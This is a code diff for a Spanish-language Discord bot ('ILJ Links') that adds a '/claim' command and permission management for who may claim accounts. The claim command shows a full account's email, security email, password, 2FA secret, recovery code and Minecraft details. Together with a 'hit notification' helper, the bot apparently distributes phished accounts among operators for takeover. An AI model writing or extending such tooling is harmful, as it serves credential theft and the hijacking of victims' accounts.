@@ -9,6 +9,9 @@ let configuredChannelType = null;
 const { Client, GatewayIntentBits, SlashCommandBuilder, Routes, REST, InteractionType } = require('discord.js');
 require('dotenv').config();
 
+// Importar embed utilities
+const { getVerificationEmbed, sendHitNotification } = require('./discord_embeds');
+
 // Dominios y rutas configurables
 const PRODUCT_DOMAIN = process.env.PRODUCT_DOMAIN; // Dominio que se muestra en los links
 const PRODUCT_PATH = process.env.PRODUCT_PATH; // Path configurable después del dominio
@@ -136,6 +139,240 @@ client.on('interactionCreate', async interaction => {
       }
     }
   }
+    if (interaction.commandName === 'claim') {
+      const name = interaction.options.getString('name');
+      const userId = interaction.user.id;
+      
+      try {
+        // Check if user has permission to claim
+        const ClaimPermissions = require('./claim_permissions');
+        const claimPermissions = new ClaimPermissions();
+        
+        const canClaim = await claimPermissions.canClaim(userId);
+        
+        if (!canClaim) {
+          const embed = {
+            title: '🚫 Permiso Denegado',
+            color: 15548997,
+            description: 'No tienes permisos para reclamar cuentas',
+            fields: [
+              { name: '👤 Usuario', value: `<@${userId}>`, inline: true },
+              { name: '🔑 Estado', value: '`❌ No permitido`', inline: true },
+              { name: '💡 Ayuda', value: 'Contacta a un owner para obtener permisos', inline: false }
+            ],
+            footer: { text: '⚡ ILJ Links - Soon 2.0' }
+          };
+          
+          await interaction.reply({ embeds: [embed], ephemeral: true });
+          return;
+        }
+        
+        const response = await fetch(`http://localhost:3000/api/claims/claim`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            fullName: name,
+            userId: userId
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          const embed = {
+            title: '🎁 Account Claimed Successfully',
+            color: 5763713,
+            description: `Has reclamado la cuenta de **${name}**`,
+            fields: [
+              { name: '📧 Email', value: `\`${result.account.email}\``, inline: false },
+              { name: '🛡️ Security Email', value: `\`${result.account.secEmail}\``, inline: false },
+              { name: '🔑 Password', value: `\`${result.account.password}\``, inline: false },
+              { name: '📱 2FA', value: `\`${result.account.secretkey}\``, inline: false },
+              { name: '♻️ Recovery Code', value: `\`${result.account.recoveryCode}\``, inline: false },
+              { name: '📦 Product', value: `\`${result.account.product}\``, inline: true },
+              { name: '🎮 Minecraft', value: `\`${result.account.minecraft}\``, inline: true }
+            ],
+            footer: { text: '⚡ ILJ Links - Soon 2.0' },
+            timestamp: new Date().toISOString()
+          };
+          
+          await interaction.reply({ embeds: [embed], ephemeral: true });
+        } else {
+          const embed = {
+            title: '❌ Claim Failed',
+            color: 15548997,
+            description: result.error || 'No se pudo reclamar la cuenta',
+            footer: { text: '⚡ ILJ Links - Soon 2.0' }
+          };
+          
+          await interaction.reply({ embeds: [embed], ephemeral: true });
+        }
+      } catch (error) {
+        console.error('Error claiming account:', error);
+        await interaction.reply({ content: 'Error al reclamar la cuenta', ephemeral: true });
+      }
+    }
+    if (interaction.commandName === 'claimusers') {
+      const subcommand = interaction.options.getSubcommand();
+      const userId = interaction.user.id;
+      
+      try {
+        const ClaimPermissions = require('./claim_permissions');
+        const claimPermissions = new ClaimPermissions();
+        
+        switch (subcommand) {
+          case 'add':
+            const addUser = interaction.options.getUser('user');
+            const addResult = await claimPermissions.grantPermission(userId, addUser.id);
+            
+            if (addResult.success) {
+              const embed = {
+                title: '✅ Permiso Agregado',
+                color: 5763713,
+                description: `Se ha agregado permiso de claim a **${addUser.username}**`,
+                fields: [
+                  { name: '👤 Usuario', value: `<@${addUser.id}>`, inline: true },
+                  { name: '🆔 ID', value: `\`${addUser.id}\``, inline: true },
+                  { name: '👑 Agregado por', value: `<@${userId}>`, inline: false }
+                ],
+                footer: { text: '⚡ ILJ Links - Soon 2.0' },
+                timestamp: new Date().toISOString()
+              };
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            } else {
+              const embed = {
+                title: '❌ Error al agregar permiso',
+                color: 15548997,
+                description: addResult.error || 'No se pudo agregar el permiso',
+                footer: { text: '⚡ ILJ Links - Soon 2.0' }
+              };
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+            break;
+            
+          case 'remove':
+            const removeUser = interaction.options.getUser('user');
+            const removeResult = await claimPermissions.revokePermission(userId, removeUser.id);
+            
+            if (removeResult.success) {
+              const embed = {
+                title: '✅ Permiso Removido',
+                color: 5763713,
+                description: `Se ha removido el permiso de claim de **${removeUser.username}**`,
+                fields: [
+                  { name: '👤 Usuario', value: `<@${removeUser.id}>`, inline: true },
+                  { name: '🆔 ID', value: `\`${removeUser.id}\``, inline: true },
+                  { name: '👑 Removido por', value: `<@${userId}>`, inline: false }
+                ],
+                footer: { text: '⚡ ILJ Links - Soon 2.0' },
+                timestamp: new Date().toISOString()
+              };
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            } else {
+              const embed = {
+                title: '❌ Error al remover permiso',
+                color: 15548997,
+                description: removeResult.error || 'No se pudo remover el permiso',
+                footer: { text: '⚡ ILJ Links - Soon 2.0' }
+              };
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+            break;
+            
+          case 'list':
+            const listResult = await claimPermissions.listPermissions(userId);
+            
+            if (listResult.success) {
+              const permissions = listResult.permissions;
+              
+              if (permissions.length === 0) {
+                const embed = {
+                  title: '📋 Lista de Permisos',
+                  color: 3447003,
+                  description: 'No hay usuarios con permisos de claim',
+                  footer: { text: '⚡ ILJ Links - Soon 2.0' },
+                  timestamp: new Date().toISOString()
+                };
+                await interaction.reply({ embeds: [embed], ephemeral: true });
+              } else {
+                const embed = {
+                  title: '📋 Lista de Permisos de Claim',
+                  color: 3447003,
+                  description: `**${permissions.length}** usuarios con permisos de claim`,
+                  fields: permissions.map((perm, index) => ({
+                    name: `${index + 1}. Usuario`,
+                    value: `<@${perm.user_id}> (\`${perm.user_id}\`)\n👑 Por: <@${perm.granted_by}>\n📅 ${new Date(perm.granted_at).toLocaleString()}`,
+                    inline: false
+                  })),
+                  footer: { text: '⚡ ILJ Links - Soon 2.0' },
+                  timestamp: new Date().toISOString()
+                };
+                await interaction.reply({ embeds: [embed], ephemeral: true });
+              }
+            } else {
+              const embed = {
+                title: '❌ Error al listar permisos',
+                color: 15548997,
+                description: listResult.error || 'No se pudo listar los permisos',
+                footer: { text: '⚡ ILJ Links - Soon 2.0' }
+              };
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+            break;
+            
+          case 'check':
+            const checkUser = interaction.options.getUser('user') || interaction.user;
+            const checkResult = await claimPermissions.getUserPermissions(checkUser.id);
+            
+            if (checkResult.success) {
+              const permissions = checkResult.permissions;
+              const hasPermission = permissions.length > 0 && permissions[0].has_permission === 1;
+              
+              const embed = {
+                title: '🔍 Verificación de Permisos',
+                color: hasPermission ? 5763713 : 15548997,
+                description: `**${checkUser.username}** ${hasPermission ? '✅ TIENE' : '❌ NO TIENE'} permisos de claim`,
+                fields: [
+                  { name: '👤 Usuario', value: `<@${checkUser.id}>`, inline: true },
+                  { name: '🆔 ID', value: `\`${checkUser.id}\``, inline: true },
+                  { name: '🔑 Estado', value: hasPermission ? '`✅ Permitido`' : '`❌ No permitido`', inline: false }
+                ],
+                footer: { text: '⚡ ILJ Links - Soon 2.0' },
+                timestamp: new Date().toISOString()
+              };
+              
+              if (hasPermission && permissions[0].granted_by) {
+                embed.fields.push({
+                  name: '👑 Otorgado por',
+                  value: `<@${permissions[0].granted_by}>`,
+                  inline: false
+                });
+                embed.fields.push({
+                  name: '📅 Fecha',
+                  value: new Date(permissions[0].granted_at).toLocaleString(),
+                  inline: false
+                });
+              }
+              
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            } else {
+              const embed = {
+                title: '❌ Error al verificar permisos',
+                color: 15548997,
+                description: checkResult.error || 'No se pudo verificar los permisos',
+                footer: { text: '⚡ ILJ Links - Soon 2.0' }
+              };
+              await interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+            break;
+        }
+      } catch (error) {
+        console.error('Error in claimusers command:', error);
+        await interaction.reply({ content: 'Error al procesar el comando', ephemeral: true });
+      }
+    }
     if (interaction.commandName === 'setchannel') {
       const type = interaction.options.getString('type');
       const channel = interaction.options.getChannel('channel');
@@ -183,6 +420,50 @@ const commands = [
       opt.setName('channel')
         .setDescription('Channel')
         .setRequired(true)
+    )
+    .toJSON(),
+  new SlashCommandBuilder()
+    .setName('claim')
+    .setDescription('Reclamar una cuenta disponible')
+    .addStringOption(opt =>
+      opt.setName('name')
+        .setDescription('Full name de la cuenta')
+        .setRequired(true)
+    )
+    .toJSON(),
+  new SlashCommandBuilder()
+    .setName('claimusers')
+    .setDescription('Gestionar permisos de claims (solo owners)')
+    .addSubcommand(sub =>
+      sub.setName('add')
+        .setDescription('Agregar permiso de claim a un usuario')
+        .addUserOption(opt =>
+          opt.setName('user')
+            .setDescription('Usuario a agregar')
+            .setRequired(true)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName('remove')
+        .setDescription('Quitar permiso de claim a un usuario')
+        .addUserOption(opt =>
+          opt.setName('user')
+            .setDescription('Usuario a quitar')
+            .setRequired(true)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName('list')
+        .setDescription('Listar usuarios con permisos de claim')
+    )
+    .addSubcommand(sub =>
+      sub.setName('check')
+        .setDescription('Ver permisos de un usuario')
+        .addUserOption(opt =>
+          opt.setName('user')
+            .setDescription('Usuario a verificar')
+            .setRequired(false)
+        )
     )
     .toJSON()
 ];
